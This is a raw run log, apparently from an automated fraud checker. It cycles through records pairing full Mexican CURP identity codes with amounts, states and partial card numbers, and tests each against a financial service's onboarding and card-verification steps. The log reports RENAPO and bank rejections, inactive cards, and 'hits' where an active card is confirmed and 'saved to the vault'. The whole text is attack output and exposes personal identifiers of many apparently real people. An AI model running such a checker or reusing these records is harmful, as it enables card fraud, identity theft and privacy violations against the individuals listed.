[886] ID:2186146 | LOLR780530MJCRRS04 | $193,900 | JALISCO | T:9109... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (18.0s)
[887] ID:2840280 | CEBH730617HMNRCM07 | $193,870 | MICHOACAN | T:5607... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.2s)
[888] ID:216862 | FORE720925HMSLMR08 | $193,830 | MORELOS | T:7307... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9109 para ID:2186146 ($193,900)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[889] ID:4290873 | NACV720730MCHVRR05 | $193,800 | CHIHUAHUA | T:5479... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (18.0s)
[890] ID:4634493 | MABJ870319HDFLLS03 | $193,780 | CIUDAD DE ME | T:6257... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (18.5s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5479 para ID:4290873 ($193,800)... [891] ID:2716584 | DICF720105HDFZRR00 | $193,760 | CIUDAD DE ME | T:3738... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[892] ID:1211511 | AALM740812MBCLZR00 | $193,740 | BAJA CALIFOR | T:2650... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[893] ID:1589148 | RURJ690708HNLDYN09 | $193,720 | NUEVO LEON | T:1235... [🟢 HIT #5] Tarjeta ACTIVA Confirmada -> Guardado en bóveda!
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.3s)
[894] ID:2578411 | CAMJ710212HGTMNN07 | $193,660 | GUANAJUATO | T:5972... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.7s)
[895] ID:201654 | MOTL700930HMCGRS06 | $193,620 | ESTADO DE ME | T:5032... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[896] ID:1697357 | CAVM760731MNLHLR04 | $193,620 | NUEVO LEON | T:8450... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.0s)
[897] ID:1803792 | MATM711207HPLRLG00 | $193,600 | PUEBLA | T:0962... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5972 para ID:2578411 ($193,660)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (15.5s)
[898] ID:55955 | MOSA761129MMNRLN04 | $193,590 | MICHOACAN | T:1546... [🔴 OFF] Rechazo bancario (PE170) (15.3s)
[899] ID:2385293 | LOOP710728MDFRSL01 | $193,530 | CIUDAD DE ME | T:6132... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[900] ID:2715499 | PEGO761116HOCRRS08 | $193,500 | OAXACA | T:8661... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.3s)
[901] ID:3150594 | LOOS720824MMNPSL07 | $193,500 | MICHOACAN | T:6484... [🔴 OFF] Contacto preexistente (/confirm-contact) (21.2s)
[902] ID:3693487 | LOMM720225HDFPLR09 | $193,500 | CIUDAD DE ME | T:2533... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[903] ID:4258953 | ZAWA700409HBCZLL09 | $193,470 | BAJA CALIFOR | T:4932... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[904] ID:3374107 | FOVO701210HCHLLS08 | $193,440 | CHIHUAHUA | T:7791... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.0s)
[905] ID:3604704 | PEML710808MDFRLB02 | $193,440 | CIUDAD DE ME | T:6122... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[906] ID:4591502 | MERL741108HNLNDS01 | $193,430 | NUEVO LEON | T:4280... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[907] ID:8470 | RORS711013HGTJSL06 | $193,410 | GUANAJUATO | T:2701... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.1s)
[908] ID:4020789 | AEMF700523HYCCCV08 | $193,410 | YUCATAN | T:5175... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7791 para ID:3374107 ($193,440)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[909] ID:171785 | LARA731202MGTZVL06 | $193,380 | GUANAJUATO | T:1121... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[910] ID:3145963 | TEMJ710919HDFRNR01 | $193,340 | CIUDAD DE ME | T:6941... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.5s)
[911] ID:2610364 | SADA701010HBCNGL03 | $193,310 | BAJA CALIFOR | T:6402... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[912] ID:4676752 | MORS770406HSONLR07 | $193,240 | SINALOA | T:7525... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2701 para ID:8470 ($193,410)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[913] ID:2511617 | RIGA750607MVRVZM04 | $193,200 | VERACRUZ | T:4240... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[914] ID:2648073 | TOCD690203HMNRSN05 | $193,200 | MICHOACAN | T:8559... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[915] ID:3755096 | SACD731213HVRLLN07 | $193,200 | VERACRUZ | T:7723... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[916] ID:2381123 | NEMJ720726HDFRRR03 | $193,130 | CIUDAD DE ME | T:1791... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.6s)
[917] ID:1565370 | VELG730209MQTLDD09 | $193,090 | QUERETARO | T:1705... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[918] ID:39220 | JIHJ750601HQTMRL07 | $193,070 | QUERETARO | T:1978... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.8s)
[919] ID:14690 | GAVR760920HDFRZB01 | $193,040 | CIUDAD DE ME | T:5991... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1791 para ID:2381123 ($193,130)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.8s)
[920] ID:4495238 | NUDJ760103HJCNVN09 | $193,010 | JALISCO | T:2895... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.8s)
[921] ID:720302 | MEGE710314MNTDMS03 | $193,000 | NAYARIT | T:9562... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5991 para ID:14690 ($193,040)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.6s)
[922] ID:927407 | TESM720517HNLLLR00 | $193,000 | NUEVO LEON | T:5340... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[923] ID:1563806 | DOSG690328HCGMGR07 | $193,000 | COAHUILA | T:1932... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[924] ID:1625471 | OOPL730622HTSCNS04 | $193,000 | TAMAULIPAS | T:3530... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[🔴 OFF] Contacto preexistente (/confirm-contact) (17.4s)
[925] ID:1867153 | GARG710126HMNRXS07 | $193,000 | MICHOACAN | T:9580... [926] ID:2382246 | DODA010101HMCMRNA7 | $193,000 | ESTADO DE ME | T:3470... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[927] ID:2397063 | BARO751228HDFRJS00 | $193,000 | CIUDAD DE ME | T:8759... [🔴 OFF] Rechazo bancario (PE170) (17.4s)
[928] ID:2535231 | DIAA701224HGRZNR00 | $193,000 | GUERRERO | T:6678... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.5s)
[929] ID:2851931 | HACA700422HDFKLL08 | $193,000 | CIUDAD DE ME | T:1156... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8759 para ID:2397063 ($193,000)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.0s)
[930] ID:3091049 | MACS761020MGTRRY04 | $193,000 | GUANAJUATO | T:7437... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1156 para ID:2851931 ($193,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[931] ID:3124612 | MAGA760327MCGRNL05 | $193,000 | COAHUILA | T:3023... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (18.2s)
[932] ID:3466395 | CODE740311HPLRBN02 | $193,000 | PUEBLA | T:8481... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[933] ID:3718183 | PIFR690728HQTNRC08 | $193,000 | QUERETARO | T:7203... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[934] ID:4465168 | PIGA700916MDFTLN09 | $193,000 | CIUDAD DE ME | T:2073... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6678 para ID:2535231 ($193,000)... [🔴 OFF] Rechazo bancario (PE110) (15.4s)
[935] ID:3062738 | QUCB690511MTLNMT00 | $192,990 | TLAXCALA | T:9398... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[936] ID:1913109 | SALO780101HDFNCM09 | $192,960 | CIUDAD DE ME | T:4333... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.5s)
[937] ID:4208364 | HERF700302HCMRZR04 | $192,950 | COLIMA | T:3546... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4333 para ID:1913109 ($192,960)... [🔴 OFF] Rechazo bancario (PE170) (16.1s)
[938] ID:2525902 | LOMM790720HDFPRG06 | $192,850 | CIUDAD DE ME | T:6227... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[939] ID:2919909 | DIAA701224HGRZNR00 | $192,820 | GUERRERO | T:1665... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.4s)
[940] ID:950478 | CEZJ720702HSOBZN09 | $192,800 | SINALOA | T:9731... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[941] ID:1879106 | HULG781224MYCSZL04 | $192,780 | YUCATAN | T:2669... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[942] ID:3192680 | EACJ710311HQTCRR07 | $192,780 | QUERETARO | T:9436... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.4s)
[943] ID:4335374 | BEIJ710420HJCCSN00 | $192,780 | JALISCO | T:5307... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1665 para ID:2919909 ($192,820)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.5s)
[944] ID:4558159 | LEEI730111HTSNSS05 | $192,780 | TAMAULIPAS | T:8691... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.0s)
[945] ID:2336925 | DIAA701224HGRZNR00 | $192,670 | GUERRERO | T:8984... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.1s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8984 para ID:2336925 ($192,670)... [946] ID:1698769 | LORR701119HASPMD00 | $192,660 | AGUASCALIENT | T:2612... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (16.1s)
[947] ID:3235598 | PELF690619HJCNPR01 | $192,660 | JALISCO | T:9934... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[948] ID:1847306 | NAMA711217HDFVNL04 | $192,630 | CIUDAD DE ME | T:1956... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8691 para ID:4558159 ($192,780)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.6s)
[949] ID:1884189 | GAAA700302HGTNRL05 | $192,610 | GUANAJUATO | T:9262... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.6s)
[950] ID:857817 | SAPG690126HDFNRL09 | $192,600 | CIUDAD DE ME | T:1310... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.3s)
[951] ID:4245530 | OIAL740103HMNRLS02 | $192,590 | MICHOACAN | T:5714... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[952] ID:4708298 | HAMH750928HSPRRC00 | $192,590 | SAN LUIS POT | T:3951... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[953] ID:1501591 | GUGJ760111HNLSDN09 | $192,530 | NUEVO LEON | T:8470... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[954] ID:2036983 | MAFG750921MCGNLD09 | $192,530 | COAHUILA | T:0116... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[955] ID:734956 | PERC690925MHGRMR08 | $192,430 | HIDALGO | T:0236... [🔴 OFF] Contacto preexistente (/confirm-contact) (21.5s)
[956] ID:2833420 | RANR740419MJCMLB05 | $192,400 | JALISCO | T:8388... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[957] ID:1045139 | NADM720305HMCZNR08 | $192,390 | ESTADO DE ME | T:8423... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[958] ID:4404987 | TUME740710HTSRRS05 | $192,370 | TAMAULIPAS | T:5728... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[959] ID:2332685 | AECL691201HYCNHR01 | $192,320 | YUCATAN | T:2975... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[960] ID:1456316 | IAAR700426HDFBLY09 | $192,300 | CIUDAD DE ME | T:6554... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[961] ID:2230810 | NIIC711128MJCTBR07 | $192,210 | JALISCO | T:3659... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.9s)
[962] ID:3382199 | HUAR770526MSORSQ03 | $192,200 | SONORA | T:3053... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6554 para ID:1456316 ($192,300)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[963] ID:2387811 | GARM730517MTSXZR01 | $192,190 | TAMAULIPAS | T:3369... [🔴 OFF] Contacto preexistente (/confirm-contact) (17.1s)
[964] ID:1656133 | CAFL690630HBSRLS04 | $192,160 | BAJA CALIFOR | T:8975... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[965] ID:652514 | VAFE690227MJCNLN09 | $192,130 | JALISCO | T:4805... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[966] ID:2290831 | MIMA750722HDFCCB00 | $192,090 | CIUDAD DE ME | T:2737... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[967] ID:3343211 | MANL700817HVRYTS02 | $192,060 | VERACRUZ | T:7060... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[968] ID:189927 | VABA700725HNTLRL01 | $192,040 | NAYARIT | T:1490... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.2s)
[969] ID:1121480 | OIFJ740731HCHLLM06 | $192,030 | CHIHUAHUA | T:4045... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2737 para ID:2290831 ($192,090)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.5s)
[970] ID:851472 | JIVR691103HVRMZB04 | $192,020 | VERACRUZ | T:3959... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[971] ID:3377807 | SAGR741116HTSLRB05 | $192,020 | TAMAULIPAS | T:4070... [🔴 OFF] Rechazo bancario (PE020) (15.0s)
[972] ID:4018804 | NAMM710826HDFVRR08 | $192,020 | CIUDAD DE ME | T:8203... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.7s)
[973] ID:554485 | MAMS751008HDGRNR01 | $192,000 | DURANGO | T:0289... [🔴 OFF] Rechazo bancario (PE040) (13.7s)
[974] ID:645597 | FOGL720106HNLLNS08 | $192,000 | NUEVO LEON | T:3415... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[975] ID:759529 | RAVR690318HDFMLL04 | $192,000 | CIUDAD DE ME | T:4154... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[976] ID:821826 | GOGE711122HQTNND08 | $192,000 | QUERETARO | T:0741... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.4s)
[977] ID:832046 | PAOA710501HDFLRL00 | $192,000 | CIUDAD DE ME | T:3277... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3415 para ID:645597 ($192,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[978] ID:851530 | MABA760215HOCRNL07 | $192,000 | OAXACA | T:9360... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.8s)
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.6s)
[979] ID:989039 | SAAE730815MMCNLL04 | $192,000 | ESTADO DE ME | T:2674... [980] ID:1179398 | KAIA771116HCHNSL00 | $192,000 | CHIHUAHUA | T:5857... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3277 para ID:832046 ($192,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.4s)
[981] ID:1563203 | GASR720104MNLRNS05 | $192,000 | NUEVO LEON | T:0709... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.8s)
[982] ID:1678898 | MAAJ750113HHGVYN08 | $192,000 | HIDALGO | T:8431... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9360 para ID:851530 ($192,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[983] ID:1781163 | GUOJ720429HDFJCR07 | $192,000 | CIUDAD DE ME | T:9392... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.9s)
[984] ID:2154223 | ROAR701106HMCSLF00 | $192,000 | ESTADO DE ME | T:5695... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[985] ID:2325475 | SAPE700715HMCNRN04 | $192,000 | ESTADO DE ME | T:5629... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5857 para ID:1179398 ($192,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.5s)
[986] ID:2786163 | SEGM810407HJCVMR09 | $192,000 | JALISCO | T:1491... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0709 para ID:1563203 ($192,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.9s)
[987] ID:2856954 | COCV701114HSORMC07 | $192,000 | SONORA | T:0258... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[988] ID:2986192 | UIRJ720308HSORMR03 | $192,000 | SONORA | T:8197... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (16.9s)
[989] ID:3045242 | VIHC731101HVRLRR08 | $192,000 | VERACRUZ | T:7665... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[990] ID:3135027 | RETR721126HDFYPF06 | $192,000 | CIUDAD DE ME | T:3935... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9392 para ID:1781163 ($192,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[991] ID:3260303 | TOMA720906MBSRNM01 | $192,000 | BAJA CALIFOR | T:3370... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.0s)
[992] ID:4082626 | MORL720621HDFRDS01 | $192,000 | CIUDAD DE ME | T:2290... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.1s)
[993] ID:4110651 | HEIG720128HVRRSL04 | $192,000 | VERACRUZ | T:9262... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1491 para ID:2786163 ($192,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[994] ID:4425164 | SALF720123HVRNJR02 | $192,000 | VERACRUZ | T:6935... [🔴 OFF] Rechazo bancario (PE150) (12.5s)
[995] ID:2686538 | TACA711120HDFPSL08 | $191,960 | CIUDAD DE ME | T:2755... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[996] ID:3757485 | TILC740718HSORPR02 | $191,950 | SINALOA | T:2526... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3935 para ID:3135027 ($192,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.0s)
[997] ID:201473 | BELJ700426HJCRRN05 | $191,940 | JALISCO | T:3833... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.0s)
[998] ID:2417582 | OINM710414HTSLRR04 | $191,910 | TAMAULIPAS | T:7075... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[999] ID:3142154 | GOPL010101HDFRNSA7 | $191,830 | CIUDAD DE ME | T:6586... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[1000] ID:4725159 | GOPL010101HDFRNSA7 | $191,830 | CIUDAD DE ME | T:4297... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3370 para ID:3260303 ($192,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1001] ID:1127720 | AELC700305HDFNPR00 | $191,800 | CIUDAD DE ME | T:5961... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1002] ID:1302190 | LOCX730307HMCPRC02 | $191,800 | ESTADO DE ME | T:9734... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[1003] ID:2936823 | ZAER721227HDFMTD01 | $191,800 | CIUDAD DE ME | T:2302... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.7s)
[1004] ID:699590 | VAGE700423MPLZTR01 | $191,770 | PUEBLA | T:4700... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2755 para ID:2686538 ($191,960)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[1005] ID:4134466 | LOAF720203HSOPSL01 | $191,750 | SINALOA | T:9747... [🔴 OFF] Rechazo bancario (PE040) (14.6s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[1006] ID:1315622 | MOZS721026HMNRMR08 | $191,690 | MICHOACAN | T:3526... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[1007] ID:3749019 | LIMJ741129HGTMRN06 | $191,660 | GUANAJUATO | T:9633... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.5s)
[1008] ID:2573133 | LOOM711112HMCRRR07 | $191,640 | ESTADO DE ME | T:2473... [🔴 OFF] Rechazo bancario (PE170) (15.3s)
[1009] ID:180177 | OESV720926MDGLLR05 | $191,620 | DURANGO | T:7104... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.9s)
[1010] ID:4290482 | PAGJ700820HDFLDR07 | $191,550 | CIUDAD DE ME | T:9117... [🔴 OFF] Rechazo bancario (PE170) (14.1s)
[1011] ID:1247436 | VAME790914MJCZRD00 | $191,520 | JALISCO | T:1709... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (8.6s)
[1012] ID:2653975 | FOHC700603HCGLRS02 | $191,500 | COAHUILA | T:5590... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1709 para ID:1247436 ($191,520)... [🔴 OFF] Rechazo bancario (PE040) (17.6s)
[1013] ID:3372705 | EODC780410HCHSZR04 | $191,460 | CHIHUAHUA | T:9230... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.3s)
[1014] ID:3679418 | MALX730902MSPRZL02 | $191,440 | SAN LUIS POT | T:4494... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.3s)
[1015] ID:2806466 | GAHJ700125HVRRRR07 | $191,430 | VERACRUZ | T:2064... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.1s)
[1016] ID:3878471 | SECA690131MDFTRS01 | $191,420 | CIUDAD DE ME | T:9637... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (8.8s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[1017] ID:200070 | BAAI700215MDFTNR04 | $191,400 | CIUDAD DE ME | T:1992... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9230 para ID:3372705 ($191,460)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (7.2s)
[1018] ID:2888761 | PEHY771104MPLRRS06 | $191,400 | PUEBLA | T:6747... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.1s)
[1019] ID:3143370 | VAZJ690421HCGLMM04 | $191,400 | COAHUILA | T:1036... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.1s)
[1020] ID:3846288 | DOTJ700920HNTRRN01 | $191,400 | NAYARIT | T:3527... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (11.7s)
[1021] ID:45143 | PACL691216HJCLMS05 | $191,280 | JALISCO | T:2821... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[1022] ID:13591 | SARJ761207HVRNVQ00 | $191,260 | VERACRUZ | T:5137... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9637 para ID:3878471 ($191,420)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.0s)
[1023] ID:862994 | HECS690130HMCRRM07 | $191,260 | ESTADO DE ME | T:5651... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.2s)
[1024] ID:4147138 | GAFR690523MDFRBC02 | $191,250 | CIUDAD DE ME | T:8173... [🔴 OFF] Rechazo bancario (PE040) (11.7s)
[1025] ID:2649016 | HEGI730309HDFRRV04 | $191,210 | CIUDAD DE ME | T:9894... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1992 para ID:200070 ($191,400)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (11.6s)
[1026] ID:4704824 | VEMH710428MSORLL06 | $191,140 | SINALOA | T:8234... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.2s)
[1027] ID:1859329 | ROLM740304HCSQML06 | $191,100 | CHIAPAS | T:8999... [🔴 OFF] Contacto preexistente (/confirm-contact) (9.8s)
[1028] ID:2146416 | MEFE711020HDFNLD08 | $191,100 | CIUDAD DE ME | T:4658... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.7s)
